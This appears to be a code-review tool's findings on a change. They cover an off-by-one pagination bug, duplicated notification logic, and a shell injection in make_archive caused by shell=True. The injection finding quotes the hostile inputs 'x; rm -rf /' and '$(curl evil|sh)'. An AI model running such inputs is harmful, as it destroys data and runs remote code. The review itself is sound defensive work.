produced_findings.claim: Pagination returns page_size + 1 items per page The changed code is `end = offset + page_size + 1` followed by `return items[offset:end]`. Python slicing excludes the end index, so `items[offset:offset+page_size]` was already exactly `page_size` items. The extra `+ 1` includes one more item. With `items=list(range(10))`, `page_number=1`, `page_size=3`, the function returns `[0, 1, 2, 3]`, four items instead of three. Page 2 returns `[3, 4, 5, 6]`, so item 3 appears on both pages. Every page except possibly the last returns one extra item. Consecutive pages overlap by one item, so callers see duplicate records. Callers that expect at most `page_size` items get more.

Duplicated message-formatting logic across notification branches The new `elif kind == "sms"` branch repeats the `email` branch's structure at `app/notify.py:2-4`. Both call `msg = format_message(user)` and then send through a channel-specific function. Only the sender function and the address attribute (`user.email` vs `user.phone`) differ. Each new channel will add another copy of the format-then-send sequence. A later change, such as per-channel formatting, error handling or logging, then has to be made in every branch, and the branches can drift apart.

Shell command injection via `name` in `make_archive` Line 5 builds `cmd = f"tar -czf {name}.tar.gz data/"` and line 6 runs it with `shell=True`. `name` is not quoted, validated, or escaped. The previous version passed `name + ".tar.gz"` as a single list element with no shell, so `name` could not be reinterpreted as shell syntax. The repository has no other caller of `make_archive` and no validation of `name`, so I could not confirm that `name` is trusted. Any `name` containing `;`, `&&`, `$(...)`, backticks, or a newline runs arbitrary commands with the privileges of the process. For example, `x; rm -rf /` or `$(curl evil|sh)`. A name with spaces or a leading `-` also changes the `tar` arguments, and that happens even with benign input.
